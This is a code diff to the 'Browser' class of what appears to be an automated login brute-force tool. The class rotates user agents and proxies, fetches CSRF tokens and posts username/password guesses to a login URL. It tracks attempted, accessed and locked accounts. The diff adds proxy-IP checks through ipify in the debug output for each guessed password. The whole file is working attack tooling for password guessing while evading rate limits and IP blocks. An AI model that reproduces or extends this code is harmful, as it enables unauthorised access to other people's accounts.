@@ -2,10 +2,13 @@
 # Author: Mohamed
 # Description: Browser
 
+import typing
 from time import time
 from random import choice
-from requests import Session
+
+import requests
 from datetime import datetime
+from requests_html import HTMLSession
 from .const import browser_data, response_codes, fetch_time, user_agents, debug
 
 
@@ -22,26 +25,34 @@ class Browser(object):
         self.is_active = True
         self.is_locked = False
         self.start_time = None
-        self.browser = self.br()
         self.username = username
         self.password = password
         self.is_attempted = False
+        self.__browser = None
 
-    def br(self):
-        header = browser_data["header"]
-        header["user-agent"] = choice(user_agents)
+    @property
+    def browser(self):
+        if self.__browser is None:
+            header = browser_data["header"]
+            header["user-agent"] = choice(user_agents)
 
-        session = Session()
-        session.headers.update(header)
-        session.proxies.update(self.proxy.addr)
-        return session
+            session = HTMLSession()
+            session.headers.update(header)
+
+            session.proxies.update(self.proxy.addr)
+            session.trust_env = False
+
+            self.__browser = session
+        return self.__browser
 
     def get_token(self):
+
         try:
             return self.browser.get(
-                browser_data["home_url"], timeout=fetch_time
+                browser_data["home_url"],
+                timeout=fetch_time,
             ).cookies.get_dict()["csrftoken"]
-        except:
+        except Exception as e:
             pass
 
     def post_data(self):
@@ -56,7 +67,9 @@ class Browser(object):
 
         try:
             resp = self.browser.post(
-                browser_data["login_url"], data=data, timeout=fetch_time
+                browser_data["login_url"],
+                data=data,
+                timeout=fetch_time,
             ).json()
 
             self.proxy.incr_success()
@@ -85,12 +98,22 @@ class Browser(object):
 
         return response_codes["failed"]
 
+    def get_ip(self) -> typing.Optional[str]:
+        url = "https://api.ipify.org/"
+
+        try:
+            r = self.browser.get(url, timeout=fetch_time)
+            return r.text
+        except Exception as e:
+            pass
+
     def authenicate(self):
         response = self.post_data()
         resp = {"attempted": False, "accessed": False, "locked": False}
 
         if debug:
-            print("pass: {} => {}".format(self.password, response))
+            ip = self.get_ip()
+            print(f"pass: {self.password}[{ip}] => {response}")
 
         if response != None:
             resp["attempted"] = True
